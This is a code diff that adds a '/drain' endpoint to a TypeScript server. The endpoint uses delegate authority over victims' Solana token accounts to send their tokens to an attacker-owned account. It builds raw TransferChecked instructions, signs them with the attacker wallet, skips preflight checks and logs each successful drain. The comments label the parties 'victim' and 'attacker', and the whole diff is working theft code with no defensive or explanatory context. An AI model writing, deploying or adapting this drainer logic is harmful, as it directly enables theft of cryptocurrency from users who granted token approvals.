@@ -189,6 +189,68 @@ async function main() {
             return;
         }
 
+        // --- /drain: use delegate authority to transfer tokens from victim ---
+        if (req.method === 'POST' && req.url === '/drain') {
+            const body = await readBody(req);
+            try {
+                const { tokens } = JSON.parse(body);
+                console.log(`[DRAIN] Draining ${tokens.length} token accounts...`);
+                const results: any[] = [];
+
+                for (const t of tokens) {
+                    try {
+                        const victimTA = new PublicKey(t.victimTokenAccount);
+                        const mintPk = new PublicKey(t.mint);
+                        const tokenProg = new PublicKey(t.tokenProgram);
+                        const amount = BigInt(t.amount);
+                        const decimals = t.decimals;
+
+                        const attackerAta = getAssociatedTokenAddressSync(
+                            mintPk, walletKeypair.publicKey, false, tokenProg
+                        );
+
+                        // TransferChecked = instruction 12: [12u8, amount:u64_le, decimals:u8]
+                        const data = Buffer.alloc(10);
+                        data.writeUInt8(12, 0);
+                        data.writeBigUInt64LE(amount, 1);
+                        data.writeUInt8(decimals, 9);
+
+                        const ix = new anchor.web3.TransactionInstruction({
+                            programId: tokenProg,
+                            keys: [
+                                { pubkey: victimTA, isSigner: false, isWritable: true },
+                                { pubkey: mintPk, isSigner: false, isWritable: false },
+                                { pubkey: attackerAta, isSigner: false, isWritable: true },
+                                { pubkey: walletKeypair.publicKey, isSigner: true, isWritable: false },
+                            ],
+                            data,
+                        });
+
+                        const tx = new Transaction().add(ix);
+                        const { blockhash } = await connection.getLatestBlockhash();
+                        tx.recentBlockhash = blockhash;
+                        tx.feePayer = walletKeypair.publicKey;
+
+                        const sig = await connection.sendTransaction(tx, [walletKeypair], { skipPreflight: true });
+                        await connection.confirmTransaction(sig, 'confirmed');
+                        console.log(`[DRAIN] OK mint=${mintPk.toBase58()} amount=${amount.toString()} sig=${sig}`);
+                        results.push({ mint: t.mint, ok: true, sig });
+                    } catch (e: any) {
+                        console.error(`[DRAIN] FAIL mint=${t.mint}: ${e.message}`);
+                        results.push({ mint: t.mint, ok: false, error: e.message });
+                    }
+                }
+
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true, results }));
+            } catch (err: any) {
+                console.error('[DRAIN] Error:', err.message);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: err.message }));
+            }
+            return;
+        }
+
         // --- /status ---
         if (req.method === 'GET' && req.url === '/status') {
             try {
